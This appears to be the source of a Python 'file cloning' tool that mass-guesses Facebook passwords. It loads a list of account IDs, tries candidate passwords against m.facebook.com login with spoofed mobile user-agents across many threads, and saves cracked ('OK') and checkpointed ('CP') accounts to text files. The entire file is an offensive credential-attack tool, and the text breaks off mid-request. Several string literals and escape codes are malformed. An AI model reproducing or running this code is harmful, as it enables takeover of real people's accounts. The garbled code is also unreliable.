#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\ [✓] installing requests !...\')
    os.system('pip install requests')
 
try:
    import concurrent.futures
except ImportError:
    print('\ [✓] installing futures !...\')
    os.system('pip install futures')
 
try:
    import bs4
except ImportError:
    print('\ [✓] installing bs4 !...\')
    os.system('pip install bs4')
 
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as alaminALAMIN
from datetime import datetime
from bs4 import BeautifulSoup
 
 
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
 
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\1b[1;97m' # 
M = '\33[1;31m' # 
H = '\33[1;32m' # 
K = '\1b[1;97m' # 
B = '\1b[1;97m' # 
U = '\1b[1;97m' # 
O = '\1b[1;97m' # 
N = '\1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
 
def jalan(z):
    for e in z + '\':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
 
logo =("""\33[1;37m
  
   _____ __________._____________  ____   _________   ____ ___ 
  /  _  \\______   \   \______   \ \   \ /   /  _  \ |    |   \
 /  /_\  \|    |  _/   ||       _/  \   Y   /  /_\  \|    |   /
/    |    \    |   \   ||    |   \   \     /    |    \    |  / 
\____|__  /______  /___||____|_  /    \___/\____|__  /______/  
        \/       \/            \/                  \/          
        
---------------------------------------------------
AUTHOR    : ABIR VAU
GITHUB    : ooo1112222
FACEBOOK  : ABIR VAU
TOOL NAME : FILE CLONE  
TYPE TYPE : FREE 
VERSION   : 1.83.0
---------------------------------------------------""")                                           
 
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\\  \1b[1;97m Total OK : \1b[1;97m %s  \1b[1;97mALAMIN_OK.txt' % (H, P, str(len(ok))))
	    print('  \1b[1;97m Total CP :\1b[1;97m   %s \1b[1;97mALAMIN_CP.txt' % (H, P, str(len(cp))))
	    input("\1b[1;97mPress enter to back ALAMIN Menu ")
	    alamin()
 
def abirvau():
    os.system('clear')
    print(logo)
    
    print
    print(' [1] Start File Cloning')
    print(' [2] Create File [Best-Method]')
    print(' [E] exit ')
    print('')
    _abirvau___ = input(' [?] Choose option : ')
    if _abirvau___ in ('1', '01'):
        __xxx__().alaminx(id)
    if _abirvau___ in ('2', '02'):
        create_file()
    if _abirvau___ in ('E', 'ee'):
        pass
 
 
class __xxx__:
    def __init__(self):
        self.id = []
    def alaminx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.abirvaux(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\ \1b[1;97m[ALAMIN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-
